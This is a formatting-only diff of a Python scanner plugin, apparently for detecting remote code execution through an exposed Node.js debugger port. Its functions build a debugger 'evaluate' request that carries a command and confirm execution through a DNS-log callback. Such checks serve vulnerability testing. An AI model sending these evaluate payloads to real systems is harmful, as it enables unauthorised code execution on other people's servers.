@@ -12,6 +12,7 @@ try:
 except Exception as e:
     import urllib.request as urllib2
 
+
 def get_plugin_info():
     plugin_info = {
         "name": "Nodejs Debugger 远程代码执行漏洞",
@@ -24,8 +25,9 @@ def get_plugin_info():
     }
     return plugin_info
 
+
 def build_payload(cmd=""):
-        payload = u'''{
+    payload = u'''{
             "seq": 1,
             "type": "request",
             "command": "evaluate",
@@ -35,8 +37,8 @@ def build_payload(cmd=""):
                 "maxStringLength": -1
             }
         }'''
-        data = u"Content-Length: {}\r\n\r\n".format(len(payload)) + payload
-        return data.encode()
+    data = u"Content-Length: {}\r\n\r\n".format(len(payload)) + payload
+    return data.encode()
 
 
 def ip_address(ip, port):
@@ -57,7 +59,6 @@ def dnslog_check(server, hash_str):
         if 'YES' in content:
             return True
     return False
-    
 
 
 def random_str(length):
@@ -84,4 +85,3 @@ def check(ip, port, timeout):
 
 if __name__ == '__main__':
     print(check("127.0.0.1", 5858, 10))
-        
